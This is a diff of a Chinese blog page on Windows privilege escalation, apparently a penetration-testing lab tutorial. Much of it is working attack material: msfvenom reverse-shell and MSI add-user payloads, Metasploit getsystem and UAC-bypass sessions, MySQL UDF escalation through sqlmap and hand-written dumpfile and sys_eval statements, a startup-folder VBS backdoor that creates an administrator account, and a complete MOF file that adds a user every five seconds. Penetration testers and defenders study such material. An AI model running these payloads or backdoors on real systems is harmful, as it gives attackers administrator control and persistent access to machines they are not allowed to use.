@@ -15,9 +15,9 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="description" content="">
-  <meta name="author" content="haha">
+  <meta name="author" content="SE_Null">
   <meta name="keywords" content="">
-  <title>windows提权 - 心上人是心上人</title>
+  <title>windows提权 - SE_Null</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -60,7 +60,7 @@
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
-       href="/">&nbsp;<strong>心上人是心上人</strong>&nbsp;</a>
+       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
             data-target="#navbarSupportedContent"
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      6.9k 字
+      7.7k 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      102
+      107
        分钟
     </span>
   
@@ -223,7 +223,7 @@
               <h2 id="1-msf提权"><a href="#1-msf提权" class="headerlink" title="1.msf提权"></a>1.msf提权</h2><p>目标：windows 7 sp1 vl：192.168.8.53</p>
 <p>攻击机：kali ：192.168.8.195</p>
 <p>生成木马：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.195 lport=1234 -f exe &gt;1.exe</code></p>
-<h3 id="1-直接提取"><a href="#1-直接提取" class="headerlink" title="1.直接提取"></a>1.直接提取</h3><p><code>getsystem</code>：在目标非管理员时候会失败</p>
+<h3 id="1-直接提权"><a href="#1-直接提权" class="headerlink" title="1.直接提权"></a>1.直接提权</h3><p><code>getsystem</code>：在目标非管理员时候会失败</p>
 <pre><code class="hljs shell">meterpreter &gt; getsystem
 [-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
 [-] Named Pipe Impersonation (In Memory/Admin)
@@ -235,6 +235,8 @@
 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
 meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM</code></pre>
+
+
 
 <h3 id="2-bypassuac"><a href="#2-bypassuac" class="headerlink" title="2.bypassuac"></a>2.bypassuac</h3><p>倘若失败后就需要bypassuac了(但是尝试本次win7主机非管理员是失败的)</p>
 <p><code>search bypassuac</code>（选用具体模块需要测试）</p>
@@ -298,6 +300,8 @@ meterpreter &gt;</code></pre>
 meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter &gt;</code></pre>
+
+
 
 
 
@@ -379,6 +383,8 @@ C:\Users\administrator.MCITP\Desktop&gt;</code></pre>
 [*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
 </code></pre>
 
+
+
 <h3 id="3-结合msf的windows补丁枚举模块"><a href="#3-结合msf的windows补丁枚举模块" class="headerlink" title="3.结合msf的windows补丁枚举模块"></a>3.结合msf的windows补丁枚举模块</h3><p><code>run post/windows/gather/enum_patches</code>查看目标的补丁信息</p>
 <pre><code class="hljs shell">meterpreter &gt; run post/windows/gather/enum_patches
 
@@ -446,7 +452,7 @@ msf6 exploit(multi/script/web_delivery) &gt;</code></pre>
 C:\Documents and Settings\Administrator&gt;</code></pre>
 
 <p>会出现问题，目前没有解决方案</p>
-<p><img src="C:\Users\haha\AppData\Roaming\Typora\typora-user-images\image-20201118104027316.png" srcset="/img/loading.gif" alt="image-20201118104027316"></p>
+<p><img src="C:\blog\pic\1.png" srcset="/img/loading.gif" alt="image-20201118104027316"></p>
 <p>可以选择上线木马获取shell</p>
 <p>目标中</p>
 <pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>dministrator&gt;at 10:49 C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>dmin
@@ -488,6 +494,8 @@ C:\WINDOWS\system32&gt;</code></pre>
 
 
 
+
+
 <h2 id="5-配置错误导致提权"><a href="#5-配置错误导致提权" class="headerlink" title="5.配置错误导致提权"></a>5.配置错误导致提权</h2><p>环境准备：目标：win10 1909 ：192.168.10.128</p>
 <p>​                    攻击机：kali：192.168.8.75</p>
 <p>先将以下保存为bat文件以管理员执行，目的是为了刚安装的虚拟机增加一些系统自启的高权限服务</p>
@@ -524,6 +532,8 @@ sc sdset WeakService3 &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCR
 Administrator            DefaultAccount           Guest
 lowuser                  WDAGUtilityAccount
 命令成功完成。</code></pre>
+
+
 
 <h3 id="1-不带引号的的路径服务"><a href="#1-不带引号的的路径服务" class="headerlink" title="1.不带引号的的路径服务"></a>1.不带引号的的路径服务</h3><h4 id="1-简述"><a href="#1-简述" class="headerlink" title="1.简述"></a>1.简述</h4><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。当Windows服务运行时，会发生以下两种情况之一。</p>
 <p>1.如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。</p>
@@ -612,14 +622,14 @@ ler /v AlwaysInstallElevated
 错误: 系统找不到指定的注册表项或值。</code></pre>
 
 <p>如果存在漏洞会输出以下</p>
-<p><img src="C:\Users\haha\AppData\Roaming\Typora\typora-user-images\image-20201120125225703.png" srcset="/img/loading.gif" alt="image-20201120125225703"></p>
+<p><img src="C:\blog\pic\2.png" srcset="/img/loading.gif" alt="image-20201120125225703"></p>
 <p>使用msf生成msi文件进行提权</p>
 <p><code>msfvenom -p windows/adduser USER=test000 PASSWORD=password123! -f msi -o rotten.msi</code></p>
 <p>目标机执行</p>
 <p><code>msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi </code></p>
 <p>​             /quiet :安装过程中禁止向用户发送消息 ; /qn : 不使用GUI ;   /i : 安装程序</p>
 <p>成功：</p>
-<p><img src="C:\Users\haha\AppData\Roaming\Typora\typora-user-images\image-20201120125306948.png" srcset="/img/loading.gif" alt="image-20201120125306948"></p>
+<p><img src="C:\blog\pic\3.png" srcset="/img/loading.gif" alt="image-20201120125306948"></p>
 <h3 id="6-Unattended-Installs"><a href="#6-Unattended-Installs" class="headerlink" title="6.Unattended Installs"></a>6.Unattended Installs</h3><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>
 <p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p>
 <pre><code class="hljs shell">C:\Windows\Panther\ 
@@ -639,25 +649,37 @@ C:\Windows\System32\sysprep\</code></pre>
 <p>msf模块（post/windows/gather/enum_unattend ）</p>
 <h2 id="6-powerup"><a href="#6-powerup" class="headerlink" title="6.powerup"></a>6.powerup</h2><p>由于本地没有配置环境，以后再更吧</p>
 <p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6436">http://www.vuln.cn/6436</a></p>
-<h2 id="7-dll相关操作"><a href="#7-dll相关操作" class="headerlink" title="7.dll相关操作"></a>7.dll相关操作</h2><h3 id="1-dll劫持"><a href="#1-dll劫持" class="headerlink" title="1.dll劫持"></a>1.dll劫持</h3><h4 id="1-dll劫持原理"><a href="#1-dll劫持原理" class="headerlink" title="1.dll劫持原理"></a>1.dll劫持原理</h4><h5 id="1-Windows-XP-SP2之前，Windows查找DLL的目录以及对应的顺序："><a href="#1-Windows-XP-SP2之前，Windows查找DLL的目录以及对应的顺序：" class="headerlink" title="1.Windows XP SP2之前，Windows查找DLL的目录以及对应的顺序："></a>1.Windows XP SP2之前，Windows查找DLL的目录以及对应的顺序：</h5><p>​        1.进程对应的应用程序所在目录；</p>
+<h2 id="7-dll相关操作"><a href="#7-dll相关操作" class="headerlink" title="7.dll相关操作"></a>7.dll相关操作</h2><h3 id="1-dll劫持"><a href="#1-dll劫持" class="headerlink" title="1.dll劫持"></a>1.dll劫持</h3><h4 id="1-dll劫持原理"><a href="#1-dll劫持原理" class="headerlink" title="1.dll劫持原理"></a>1.dll劫持原理</h4><ul>
+<li>Windows XP SP2之前，Windows查找DLL的目录以及对应的顺序：</li>
+</ul>
+<p>​        1.进程对应的应用程序所在目录；</p>
 <p>​        2.当前目录（Current Directory）；</p>
 <p>​        3.系统目录（通过 GetSystemDirectory 获取）；</p>
 <p>​        4.16位系统目录；</p>
 <p>​        5.Windows目录（通过 GetWindowsDirectory 获取）；</p>
 <p>​        6.PATH环境变量中的各个目录；</p>
-<p>例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。</p>
-<h5 id="2-在winxdows-xp-sp2之后，Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode-默认会被开启）："><a href="#2-在winxdows-xp-sp2之后，Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode-默认会被开启）：" class="headerlink" title="2.在winxdows xp sp2之后，Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）："></a>2.在winxdows xp sp2之后，Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：</h5><p>默认注册表为：<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code>，其键值为1</p>
+<p>​        例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，        就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。</p>
+<ul>
+<li><p>在winxdows xp sp2之后，Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：</p>
+<p>默认注册表为：<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code>，其键值为1</p>
+</li>
+</ul>
 <p>​        1.进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</p>
 <p>​        2.系统目录（即%windir%system32）；</p>
 <p>​        3.16位系统目录（即%windir%system）；</p>
 <p>​        4.Windows目录（即%windir%）；</p>
 <p>​        5.当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</p>
 <p>​        6.PATH环境变量中的各个目录；</p>
-<h5 id="3-windows7以上"><a href="#3-windows7以上" class="headerlink" title="3 windows7以上"></a>3 windows7以上</h5><p>系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：</p>
-<p><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p>
+<ul>
+<li><p>windows7以上</p>
+<p>系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p>
 <p>那么最终Windows203以上以及win7以上操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p>
-<p>​            1.默认情况下，如果软件安装在c盘根目录，而不是c:\Program Files，那经过身份验证的用户具有该目录的写权限，另外，perl，python，ruby等软件通常都添加到path变量中。那攻击者可以在当前目录中编写恶意DLL，只要重新运行exe程序就会中招。</p>
-<p>​            2.SafeDllSearchMode + KnownDLLs二者结合可用来防范dll劫持，但是如果调用”不常见”的dll，也就是并未出现在KnownDLLs的列表中，那么无论SafeDllSearchMode是否开启，dll搜索的第一顺序均为程序的当前目录，这里就存在一个DLL劫持漏洞（在程序同级目录下预先放置一个同名dll，在进程启动的过程中会优先加载，实现劫持。</p>
+<ul>
+<li>默认情况下，如果软件安装在c盘根目录，而不是c:\Program Files，那经过身份验证的用户具有该目录的写权限，另外，perl，python，ruby等软件通常都添加到path变量中。那攻击者可以在当前目录中编写恶意DLL，只要重新运行exe程序就会中招。</li>
+<li>SafeDllSearchMode + KnownDLLs二者结合可用来防范dll劫持，但是如果调用”不常见”的dll，也就是并未出现在KnownDLLs的列表中，那么无论SafeDllSearchMode是否开启，dll搜索的第一顺序均为程序的当前目录，这里就存在一个DLL劫持漏洞（在程序同级目录下预先放置一个同名dll，在进程启动的过程中会优先加载，实现劫持。</li>
+</ul>
+</li>
+</ul>
 <h4 id="2-实例演示"><a href="#2-实例演示" class="headerlink" title="2.实例演示"></a>2.实例演示</h4><p>这里就不演示了，只是提供一个思路吧，后续会补发文章。</p>
 <p>1.启动应用程序<br> 2.使用Process Explorer等类似软件查看该应用程序启动后加载的动态链接库。<br> 3.从该应用程序已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。<br> 4.编写第三步中获取到的DLL的劫持DLL（不考虑软件是否正常运行可以直接使用msf生成一个dll进行替换；反之可以使用<a target="_blank" rel="noopener" href="https://github.com/coca1ne/DLL_Hijacker">DLL_Hijacker.py</a>生成指定dll的cpp文件，再编译为dll文件，具体操作请查阅资料，这里不再提供了）。<br> 5.将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。</p>
 <h4 id="3-防范"><a href="#3-防范" class="headerlink" title="3.防范"></a>3.防范</h4><p>1、开发者需要注意的问题：</p>
@@ -675,29 +697,10 @@ C:\Windows\System32\sysprep\</code></pre>
 <h3 id="2-dll注入"><a href="#2-dll注入" class="headerlink" title="2.dll注入"></a>2.dll注入</h3><p>后面和dll劫持均开一篇单独更吧，先看一下下面这篇文章</p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86671">https://www.anquanke.com/post/id/86671</a></p>
 <p>针对dll劫持和dll注入后续会专门写文章来阐述清楚，这里只是先做一个提示。</p>
-<h2 id="8-数据库提权"><a href="#8-数据库提权" class="headerlink" title="8.数据库提权"></a>8.数据库提权</h2><h3 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h3><p>udf提权：udf，MySQL扩展接口，用户自定义函数；mysql会调用一些资源，会把当前账号转化为system权限</p>
-<p>系统要求：win7以下</p>
-<p>mysql：小于5.7，root权限、未开启安全模式(mysql安全模式默认关闭)</p>
-<h4 id="1-sqlmap提权"><a href="#1-sqlmap提权" class="headerlink" title="1.sqlmap提权"></a>1.sqlmap提权</h4><p>经过测试，win7、2k3、2k8均可，且mysql5.7.26也可</p>
+<h2 id="8-数据库提权"><a href="#8-数据库提权" class="headerlink" title="8.数据库提权"></a>8.数据库提权</h2><h3 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h3><h4 id="1-sqlmap提权"><a href="#1-sqlmap提权" class="headerlink" title="1.sqlmap提权"></a>1.sqlmap提权</h4><p>测试环境：win7、2k3、2k8均可，ver(mysql)&gt;=5.0也可</p>
 <p>mysql需要设置<code>grant all privileges on *.* to &#39;连接的账户名&#39;@&#39;%&#39; identified by &#39;密码&#39;;</code></p>
 <p>如果只想某指定ip访问，可将%替换为指定ip  ,再重启服务即可</p>
 <pre><code class="hljs shell">root@kali:~# sqlmap -d &quot;mysql://root:root@192.168.8.64:3306/mysql&quot; --os-shell
-        ___
-       __H__                                                                                   
- ___ ___[,]_____ ___ ___  &#123;1.4.11#stable&#125;                                                      
-|_ -| . [.]     | .&#x27;| . |                                                                      
-|___|_  [.]_|_|_|__,|  _|                                                                      
-      |_|V...       |_|   http://sqlmap.org                                                    
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 11:55:30 /2020-11-22/
-
-[11:55:30] [CRITICAL] SQLAlchemy connection issue (&#x27;OperationalError: (MySQLdb._exceptions.OperationalError) (1045, &quot;Access denied for user &#x27;root&#x27;@&#x27;192.168.8.75&#x27; (using password: YES)&quot;)&#x27;)   
-
-[*] ending @ 11:55:30 /2020-11-22/
-
-root@kali:~# sqlmap -d &quot;mysql://root:root@192.168.8.64:3306/mysql&quot; --os-shell
         ___
        __H__                                                                                   
  ___ ___[)]_____ ___ ___  &#123;1.4.11#stable&#125;                                                      
@@ -709,50 +712,117 @@ root@kali:~# sqlmap -d &quot;mysql://root:root@192.168.8.64:3306/mysql&quot; --o
 
 [*] starting @ 12:05:59 /2020-11-22/
 
-[12:06:16] [INFO] connection to MySQL server &#x27;192.168.8.64:3306&#x27; established
-[12:06:16] [INFO] testing MySQL
-[12:06:16] [INFO] confirming MySQL
-[12:06:16] [INFO] the back-end DBMS is MySQL
-[12:06:16] [WARNING] (remote) ProgrammingError: (MySQLdb._exceptions.ProgrammingError) not enough arguments for format string
-[12:06:16] [WARNING] (remote) ProgrammingError: (MySQLdb._exceptions.ProgrammingError) not enough arguments for format string
-[12:06:16] [WARNING] (remote) ProgrammingError: (MySQLdb._exceptions.ProgrammingError) not enough arguments for format string
-[12:06:16] [WARNING] (remote) ProgrammingError: (MySQLdb._exceptions.ProgrammingError) not enough arguments for format string
-[12:06:16] [WARNING] (remote) ProgrammingError: (MySQLdb._exceptions.ProgrammingError) not enough arguments for format string
-back-end DBMS: MySQL &gt;= 5.0.0
-[12:06:16] [INFO] fingerprinting the back-end DBMS operating system
-[12:06:16] [INFO] the back-end DBMS operating system is Windows
-[12:06:16] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, &quot;Unknown table &#x27;sqlmapfile&#x27;&quot;)
-[12:06:16] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, &quot;Unknown table &#x27;sqlmapfilehex&#x27;&quot;)
-[12:06:16] [INFO] testing if current user is DBA
-[12:06:16] [INFO] fetching current user
+...
+太长了，无关紧要，省略
+...
 what is the back-end database management system architecture?
 [1] 32-bit (default)
 [2] 64-bit
 <span class="hljs-meta">&gt;</span><span class="bash"> 2</span>
-[12:06:23] [INFO] checking if UDF &#x27;sys_exec&#x27; already exist
-[12:06:23] [INFO] checking if UDF &#x27;sys_eval&#x27; already exist
-[12:06:23] [INFO] detecting back-end DBMS version from its banner
-[12:06:23] [INFO] retrieving MySQL plugin directory absolute path
-[12:06:23] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, &quot;Unknown table &#x27;sqlmapfile&#x27;&quot;)
-[12:06:23] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1290, &#x27;The MySQL server is running with the --secure-file-priv option so it cannot execute this statement&#x27;)                                                                                          
-[12:06:23] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
-[12:06:23] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, &quot;Unknown table &#x27;sqlmapfilehex&#x27;&quot;)
-[12:06:23] [ERROR] there has been a problem uploading the shared library, it looks like the binary file has not been written on the database underlying file system
-do you want to proceed anyway? Beware that the operating system takeover will fail [y/N] y
-[12:06:27] [INFO] creating UDF &#x27;sys_exec&#x27; from the binary UDF file
-[12:06:27] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1305, &#x27;FUNCTION mysql.sys_exec does not exist&#x27;)                                                       
-[12:06:27] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1126, &quot;Can&#x27;t open shared library &#x27;libszcug.dll&#x27; (errno: 126 )&quot;)
-[12:06:27] [INFO] creating UDF &#x27;sys_eval&#x27; from the binary UDF file
-[12:06:27] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1305, &#x27;FUNCTION mysql.sys_eval does not exist&#x27;)                                                       
-[12:06:27] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1126, &quot;Can&#x27;t open shared library &#x27;libszcug.dll&#x27; (errno: 126 )&quot;)
-[12:06:27] [WARNING] (remote) OperationalError: (MySQLdb._exceptions.OperationalError) (1051, &quot;Unknown table &#x27;sqlmapoutput&#x27;&quot;)
-[12:06:27] [INFO] going to use injected user-defined functions &#x27;sys_eval&#x27; and &#x27;sys_exec&#x27; for operating system command execution
-[12:06:27] [INFO] calling Windows OS shell. To quit type &#x27;x&#x27; or &#x27;q&#x27; and press ENTER
+...
+太长了，无关紧要，省略
+...
 <span class="hljs-meta">os-shell&gt;</span><span class="bash"> </span></code></pre>
 
-<h4 id="2-手动提权-借助PHP大马"><a href="#2-手动提权-借助PHP大马" class="headerlink" title="2.手动提权(借助PHP大马)"></a>2.手动提权(借助PHP大马)</h4><p>这里就不贴图了，但要注意的是你能执行的功能是根据你上传的dll文件来的，你dll文件里面函数有啥功能你就能执行啥，另外需注意：</p>
-<p>version(mysql)&gt;5.1：udf.dll文件需上传到lib\plugin下</p>
-<p>version(mysql)&lt;5.1：udf.dll文件需上传到c:\windows\system32(win2003版本)</p>
+
+
+<h4 id="2-udf提权"><a href="#2-udf提权" class="headerlink" title="2.udf提权"></a>2.udf提权</h4><p>现在大多数Mysql版本都大于5.1，版本大于5.1后对于提权的条件很苛刻，所以大多数情况下都没办法使用udf进行一个提权</p>
+<p>测试环境：winserver2012、ver(mysql)&gt;=5.0、phpmyadmin（或者能够连接到mysql数据库的就OK）</p>
+<p><strong>udf</strong>：UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 由于是用户自定义的函数，所以我们可以利用UDF创建一个执行命令的函数。mysql会调用一些资源，会把当前账号转化为system权限</p>
+<p><strong>需要有以下注意项</strong>：</p>
+<ul>
+<li>version(mysql)&gt;5.1：udf.dll文件需上传到mysql的安装目录的lib\plugin下</li>
+<li>5.0&lt;=version(mysql)&lt;5.1：udf.dll文件需上传到c:\windows\system32(win2003版本)</li>
+<li>version(mysql)&lt;5.0：上传路径随意</li>
+<li>掌握mysql数据库的账户，拥有对mysql的insert和delete权限，以创建和抛弃函数。</li>
+<li>拥有可以将udf.dll写入相应目录的权限。</li>
+</ul>
+<p>sqlmap自带udf.dll位置:/usr/share/sqlmap/data/udf/mysql/  分为linux、windows两个版本</p>
+<p><strong>提权方式</strong></p>
+<ul>
+<li>1、首先查看mysql版本：<code>select version();</code></li>
+<li>2、再将符合mysql版本的udf文件上传至对应目录，但是需注意的是Sqlmap将原本的dll文件进行了编码处理,我们需要通过脚本进行解密获得dll文件。 执行<code>python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll</code>进行dll文件的解码，获得dll文件。</li>
+<li>3、这里获得的dll文件，是一个二进制进制文件，我们通过查询语句将dll上传到目标服务器上。由于目标版本为<code>5.0&lt;=mysql&lt;5.1</code> ，所以将dll文件上传到目标的系统目录下面。执行语句<code>select 0x[code] into dumpfile &#39;C:\\Windows\\System32\\cooltige.dll&#39;</code>（关于此语句可以查看linux提权中的udf提权）。</li>
+<li>4、通过dll文件创建函数。<code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;cooltige.dll&#39;</code></li>
+<li>5、创建成功后就可以直接执行命令。例如：<code>select sys_eval(&#39;whoami&#39;)</code></li>
+<li>6、删除创建的函数<code>DROP FUNCTION sys_eval;</code></li>
+<li>7、验证函数是否删除成功，输出结果为N/A就为删除成功。<code>select * from mysql.func where name = &#39;sys_eval&#39;;</code></li>
+</ul>
+<p>另外如果有大马就不用这么麻烦，直接上传udf文件，再执行命令就可以了，不用上述方法的2、3步了</p>
+<h4 id="3-开机启动项提权"><a href="#3-开机启动项提权" class="headerlink" title="3.开机启动项提权"></a>3.开机启动项提权</h4><p>前提：mysql：root，system运行</p>
+<p>利用MySQL，将后门写入开机启动项。同时因为是开机自启动，再写入之后，需要重启目标服务器，才可以运行。</p>
+<p>一般这么搞多是windows下的mysql环境，将一段 VBS脚本导入到  C:\Documents and Settings\All Users\「开始」菜单\程序\启动 下，如果管理员重启了服务器，那么就会自动调用该脚本，并执行其中的用户添加及提权命令</p>
+<p>vbs代码</p>
+<pre><code class="hljs shell">setwsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)
+os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName
+Set ob=GetObject(os)
+Setoe=GetObject(os&amp;&quot;/Administrators,group&quot;)
+Set od=ob.Create(&quot;user&quot;,&quot;secist&quot;)
+od.SetPassword &quot;secist.com&quot;
+od.SetInfo
+Set of=GetObject(os&amp;&quot;/secist&quot;,user)
+oe.add os&amp;&quot;/secist&quot;</code></pre>
+
+<p>亦或者通过大马的mysql执行命令</p>
+<pre><code class="hljs mysql">create table secist(cmd text);
+
+insert into secist values(“set wshshell&#x3D;createobject(“”wscript.shell””)”);
+
+insert into secist values(“a&#x3D;wshshell.run(“”cmd.exe &#x2F;c net user secist secist.com &#x2F;add“”,0)”);
+
+insert into secist values(“b&#x3D;wshshell.run(“”cmd.exe &#x2F;c net localgroup administrators secist &#x2F;add“”,0)”);
+
+select * from secist into dumpfile “C:\Documents and Settings\All Users\「开始」菜单\程序\启动\secist.vbs”;</code></pre>
+
+<p>成功执行以上命令后，只要管理员重启了服务器，我们就可以成功提权了！</p>
+<h4 id="4-mof提权"><a href="#4-mof提权" class="headerlink" title="4.mof提权"></a>4.mof提权</h4><p><strong>前提</strong>：version(win)&lt;03、mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录、secure-file-priv参数不为null</p>
+<p><strong>secure-file-priv</strong>：secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的</p>
+<ul>
+<li>当secure_file_priv的值为null ，表示限制mysql不允许导入导出。</li>
+<li>当secure_file_priv的值为/tmp/ ，表示限制mysql的导入导出只能发生在/tmp/目录下。</li>
+<li>当secure_file_priv的值没有具体值时，表示不对mysql的导入导出做限制。</li>
+</ul>
+<p>通过执行<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>查看secure-file-priv的状态。</p>
+<p><strong>原理</strong>：利用 c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件每5秒钟去执行一次的特性，且为system权限，通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
+<p><strong>MOF文件</strong>：托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p>
+<p><strong>nullevt.mof</strong>(注：实际是利用其达到：<code>net.exe user hpdoger 123456 /add\</code>)</p>
+<pre><code class="hljs routeros"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span>
+instance of __EventFilter as <span class="hljs-variable">$EventFilter</span>
+&#123;
+EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;
+Name = <span class="hljs-string">&quot;filtP2&quot;</span>;
+Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span>
+<span class="hljs-string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span>
+<span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;
+QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>;
+&#125;;
+instance of ActiveScriptEventConsumer as <span class="hljs-variable">$Consumer</span>
+&#123;
+Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;
+ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;
+ScriptText =
+<span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;</span>;
+&#125;;
+instance of __FilterToConsumerBinding
+&#123;
+Consumer = <span class="hljs-variable">$Consumer</span>;
+Filter = <span class="hljs-variable">$EventFilter</span>;
+&#125;;</code></pre>
+
+<p><strong>文件利用</strong></p>
+<p>将nullevt.mof传到具有读写权限的目录下，在phpmyadmin中利用load_file将其传入到<code>c:/windows/system32/wbem/mof/</code>下（不用outfile是因为其会在末端写入新行，被当作二进制文件时无法执行，故使用dumpfile导出一行数据）</p>
+<pre><code class="hljs mysql">select load_file(&quot;C:&#x2F;Documents and Settings&#x2F;testtest.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;;</code></pre>
+
+<p>之后mof会被直接执行，且5秒创建一次用户，之后就是将创建的用户的那一行代码换成加入administrator即可</p>
+<p><code>net.exe user localgroup administrator hpdoger /add\</code></p>
+<p><strong>弊端</strong></p>
+<p>每5秒创建一次，不好删。。。</p>
+<p>其实也可删的，cmd下面执行</p>
+<pre><code class="hljs shell">net stop winmgmt
+del c:/windows/system32/wbem/repository
+net start winmgmt</code></pre>
+
+<p>重启服务就ok。</p>
 <h3 id="2-SQL-server提权-1433"><a href="#2-SQL-server提权-1433" class="headerlink" title="2.SQL server提权:1433"></a>2.SQL server提权:1433</h3><p>根据存储过程sa权限来提权</p>
